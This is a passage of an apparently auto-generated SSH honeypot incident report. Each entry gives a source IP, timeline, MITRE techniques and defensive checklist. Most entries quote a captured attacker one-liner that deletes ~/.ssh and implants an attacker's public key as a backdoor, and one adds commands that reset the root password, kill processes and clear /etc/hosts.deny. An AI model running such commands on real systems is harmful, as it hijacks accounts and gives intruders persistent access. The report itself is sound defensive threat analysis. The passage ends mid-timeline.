| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:07 |
| **Last Seen** | 2026-04-12 21:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:07:26` | `cowrie.session.connect` |
| `2026-04-12 21:07:26` | `cowrie.client.version` |
| `2026-04-12 21:07:27` | `cowrie.client.kex` |
| `2026-04-12 21:07:28` | `cowrie.login.success` |
| `2026-04-12 21:07:29` | `cowrie.session.params` |
| `2026-04-12 21:07:29` | `cowrie.command.input` |
| `2026-04-12 21:07:29` | `cowrie.command.failed` |
| `2026-04-12 21:07:29` | `cowrie.log.closed` |
| `2026-04-12 21:07:30` | `cowrie.session.params` |
| `2026-04-12 21:07:30` | `cowrie.command.input` |
| `2026-04-12 21:07:30` | `cowrie.session.file_download` |
| `2026-04-12 21:07:30` | `cowrie.log.closed` |
| `2026-04-12 21:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a56997c5c81

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:07 |
| **Last Seen** | 2026-04-12 21:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:07:33` | `cowrie.session.connect` |
| `2026-04-12 21:07:33` | `cowrie.client.version` |
| `2026-04-12 21:07:34` | `cowrie.client.kex` |
| `2026-04-12 21:07:35` | `cowrie.login.success` |
| `2026-04-12 21:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775c4a0020f5

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:13 |
| **Last Seen** | 2026-04-12 21:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:13:35` | `cowrie.session.connect` |
| `2026-04-12 21:13:35` | `cowrie.client.version` |
| `2026-04-12 21:13:36` | `cowrie.client.kex` |
| `2026-04-12 21:13:37` | `cowrie.login.success` |
| `2026-04-12 21:13:37` | `cowrie.session.params` |
| `2026-04-12 21:13:37` | `cowrie.command.input` |
| `2026-04-12 21:13:37` | `cowrie.command.failed` |
| `2026-04-12 21:13:38` | `cowrie.log.closed` |
| `2026-04-12 21:13:38` | `cowrie.session.params` |
| `2026-04-12 21:13:38` | `cowrie.command.input` |
| `2026-04-12 21:13:39` | `cowrie.session.file_download` |
| `2026-04-12 21:13:39` | `cowrie.log.closed` |
| `2026-04-12 21:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e526b581d6

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:13 |
| **Last Seen** | 2026-04-12 21:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:13:42` | `cowrie.session.connect` |
| `2026-04-12 21:13:42` | `cowrie.client.version` |
| `2026-04-12 21:13:42` | `cowrie.client.kex` |
| `2026-04-12 21:13:43` | `cowrie.login.success` |
| `2026-04-12 21:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1769e7698425

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:18 |
| **Last Seen** | 2026-04-12 21:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:18:17` | `cowrie.session.connect` |
| `2026-04-12 21:18:17` | `cowrie.client.version` |
| `2026-04-12 21:18:18` | `cowrie.client.kex` |
| `2026-04-12 21:18:19` | `cowrie.login.success` |
| `2026-04-12 21:18:19` | `cowrie.session.params` |
| `2026-04-12 21:18:19` | `cowrie.command.input` |
| `2026-04-12 21:18:19` | `cowrie.command.failed` |
| `2026-04-12 21:18:20` | `cowrie.log.closed` |
| `2026-04-12 21:18:20` | `cowrie.session.params` |
| `2026-04-12 21:18:20` | `cowrie.command.input` |
| `2026-04-12 21:18:21` | `cowrie.session.file_download` |
| `2026-04-12 21:18:21` | `cowrie.log.closed` |
| `2026-04-12 21:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1846b3d5c1f

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:18 |
| **Last Seen** | 2026-04-12 21:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:18:24` | `cowrie.session.connect` |
| `2026-04-12 21:18:24` | `cowrie.client.version` |
| `2026-04-12 21:18:24` | `cowrie.client.kex` |
| `2026-04-12 21:18:26` | `cowrie.login.success` |
| `2026-04-12 21:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72739609338a

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:19 |
| **Last Seen** | 2026-04-12 21:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:19:57` | `cowrie.session.connect` |
| `2026-04-12 21:19:57` | `cowrie.client.version` |
| `2026-04-12 21:19:57` | `cowrie.client.kex` |
| `2026-04-12 21:19:59` | `cowrie.login.success` |
| `2026-04-12 21:19:59` | `cowrie.session.params` |
| `2026-04-12 21:19:59` | `cowrie.command.input` |
| `2026-04-12 21:19:59` | `cowrie.command.failed` |
| `2026-04-12 21:19:59` | `cowrie.log.closed` |
| `2026-04-12 21:20:00` | `cowrie.session.params` |
| `2026-04-12 21:20:00` | `cowrie.command.input` |
| `2026-04-12 21:20:00` | `cowrie.session.file_download` |
| `2026-04-12 21:20:00` | `cowrie.log.closed` |
| `2026-04-12 21:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb71ca3cb44

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:20 |
| **Last Seen** | 2026-04-12 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:20:04` | `cowrie.session.connect` |
| `2026-04-12 21:20:04` | `cowrie.client.version` |
| `2026-04-12 21:20:04` | `cowrie.client.kex` |
| `2026-04-12 21:20:05` | `cowrie.login.success` |
| `2026-04-12 21:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca242088900

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:21 |
| **Last Seen** | 2026-04-12 21:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:21:37` | `cowrie.session.connect` |
| `2026-04-12 21:21:37` | `cowrie.client.version` |
| `2026-04-12 21:21:37` | `cowrie.client.kex` |
| `2026-04-12 21:21:38` | `cowrie.login.success` |
| `2026-04-12 21:21:39` | `cowrie.session.params` |
| `2026-04-12 21:21:39` | `cowrie.command.input` |
| `2026-04-12 21:21:39` | `cowrie.command.failed` |
| `2026-04-12 21:21:39` | `cowrie.log.closed` |
| `2026-04-12 21:21:40` | `cowrie.session.params` |
| `2026-04-12 21:21:40` | `cowrie.command.input` |
| `2026-04-12 21:21:40` | `cowrie.session.file_download` |
| `2026-04-12 21:21:40` | `cowrie.log.closed` |
| `2026-04-12 21:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2350f94c953

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:21 |
| **Last Seen** | 2026-04-12 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:21:44` | `cowrie.session.connect` |
| `2026-04-12 21:21:44` | `cowrie.client.version` |
| `2026-04-12 21:21:44` | `cowrie.client.kex` |
| `2026-04-12 21:21:45` | `cowrie.login.success` |
| `2026-04-12 21:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33941cc55d59

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:23 |
| **Last Seen** | 2026-04-12 21:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:23:10` | `cowrie.session.connect` |
| `2026-04-12 21:23:10` | `cowrie.client.version` |
| `2026-04-12 21:23:10` | `cowrie.client.kex` |
| `2026-04-12 21:23:11` | `cowrie.login.success` |
| `2026-04-12 21:23:12` | `cowrie.session.params` |
| `2026-04-12 21:23:12` | `cowrie.command.input` |
| `2026-04-12 21:23:12` | `cowrie.command.failed` |
| `2026-04-12 21:23:12` | `cowrie.log.closed` |
| `2026-04-12 21:23:13` | `cowrie.session.params` |
| `2026-04-12 21:23:13` | `cowrie.command.input` |
| `2026-04-12 21:23:13` | `cowrie.session.file_download` |
| `2026-04-12 21:23:13` | `cowrie.log.closed` |
| `2026-04-12 21:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb8fdfa5074

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-12 21:23 |
| **Last Seen** | 2026-04-12 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:23:17` | `cowrie.session.connect` |
| `2026-04-12 21:23:17` | `cowrie.client.version` |
| `2026-04-12 21:23:17` | `cowrie.client.kex` |
| `2026-04-12 21:23:18` | `cowrie.login.success` |
| `2026-04-12 21:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b45a0aabc7

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-04-12 21:31 |
| **Last Seen** | 2026-04-12 21:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:31:48` | `cowrie.session.connect` |
| `2026-04-12 21:31:48` | `cowrie.client.version` |
| `2026-04-12 21:31:48` | `cowrie.client.kex` |
| `2026-04-12 21:31:49` | `cowrie.login.success` |
| `2026-04-12 21:31:49` | `cowrie.session.params` |
| `2026-04-12 21:31:49` | `cowrie.command.input` |
| `2026-04-12 21:31:49` | `cowrie.command.failed` |
| `2026-04-12 21:31:50` | `cowrie.log.closed` |
| `2026-04-12 21:31:50` | `cowrie.session.params` |
| `2026-04-12 21:31:50` | `cowrie.command.input` |
| `2026-04-12 21:31:50` | `cowrie.session.file_download` |
| `2026-04-12 21:31:50` | `cowrie.log.closed` |
| `2026-04-12 21:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed754936680

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-04-12 21:31 |
| **Last Seen** | 2026-04-12 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:31:52` | `cowrie.session.connect` |
| `2026-04-12 21:31:52` | `cowrie.client.version` |
| `2026-04-12 21:31:52` | `cowrie.client.kex` |
| `2026-04-12 21:31:53` | `cowrie.login.success` |
| `2026-04-12 21:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8258cb0a75b4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.42[.]17` |
| **First Seen** | 2026-04-12 21:39 |
| **Last Seen** | 2026-04-12 21:40 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cCJ18p95NPGe"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 21:39:38` | `cowrie.session.connect` |
| `2026-04-12 21:39:38` | `cowrie.client.version` |
| `2026-04-12 21:39:38` | `cowrie.client.kex` |
| `2026-04-12 21:39:42` | `cowrie.login.success` |
| `2026-04-12 21:39:43` | `cowrie.session.params` |
| `2026-04-12 21:39:43` | `cowrie.command.input` |
| `2026-04-12 21:39:43` | `cowrie.command.failed` |
| `2026-04-12 21:39:43` | `cowrie.log.closed` |
| `2026-04-12 21:39:44` | `cowrie.session.params` |
| `2026-04-12 21:39:44` | `cowrie.command.input` |
| `2026-04-12 21:39:44` | `cowrie.session.file_download` |
| `2026-04-12 21:39:44` | `cowrie.log.closed` |
| `2026-04-12 21:40:00` | `cowrie.session.params` |
| `2026-04-12 21:40:00` | `cowrie.command.input` |
| `2026-04-12 21:40:01` | `cowrie.log.closed` |
| `2026-04-12 21:40:01` | `cowrie.session.params` |
| `2026-04-12 21:40:01` | `cowrie.command.input` |
| `2026-04-12 21:40:01` | `cowrie.log.closed` |
| `2026-04-12 21:40:03` | `cowrie.session.params` |
| `2026-04-12 21:40:03` | `cowrie.command.input` |
| `2026-04-12 21:40:03` | `cowrie.session.file_download` |
| `2026-04-12 21:40:03` | `cowrie.log.closed` |
| `2026-04-12 21:40:04` | `cowrie.session.params` |
| `2026-04-12 21:40:04` | `cowrie.command.input` |
| `2026-04-12 21:40:04` | `cowrie.log.closed` |
| `2026-04-12 21:40:05` | `cowrie.session.params` |
| `2026-04-12 21:40:05` | `cowrie.command.input` |
| `2026-04-12 21:40:05` | `cowrie.log.closed` |
| `2026-04-12 21:40:06` | `cowrie.session.params` |
| `2026-04-12 21:40:06` | `cowrie.command.input` |
| `2026-04-12 21:40:06` | `cowrie.command.input` |
| `2026-04-12 21:40:06` | `cowrie.log.closed` |
| `2026-04-12 21:40:07` | `cowrie.session.params` |
| `2026-04-12 21:40:07` | `cowrie.command.input` |
| `2026-04-12 21:40:07` | `cowrie.log.closed` |
| `2026-04-12 21:40:07` | `cowrie.session.params` |
| `2026-04-12 21:40:07` | `cowrie.command.input` |
| `2026-04-12 21:40:08` | `cowrie.log.closed` |
| `2026-04-12 21:40:08` | `cowrie.session.params` |
| `2026-04-12 21:40:08` | `cowrie.command.input` |
| `2026-04-12 21:40:08` | `cowrie.log.closed` |
| `2026-04-12 21:40:09` | `cowrie.session.params` |
| `2026-04-12 21:40:09` | `cowrie.command.input` |
| `2026-04-12 21:40:09` | `cowrie.log.closed` |
| `2026-04-12 21:40:09` | `cowrie.session.params` |
| `2026-04-12 21:40:09` | `cowrie.command.input` |
| `2026-04-12 21:40:09` | `cowrie.log.closed` |
| `2026-04-12 21:40:10` | `cowrie.session.params` |
| `2026-04-12 21:40:10` | `cowrie.command.input` |
| `2026-04-12 21:40:10` | `cowrie.log.closed` |
| `2026-04-12 21:40:11` | `cowrie.session.params` |
| `2026-04-12 21:40:11` | `cowrie.command.input` |
| `2026-04-12 21:40:11` | `cowrie.log.closed` |
| `2026-04-12 21:40:12` | `cowrie.session.params` |
| `2026-04-12 21:40:12` | `cowrie.command.input` |
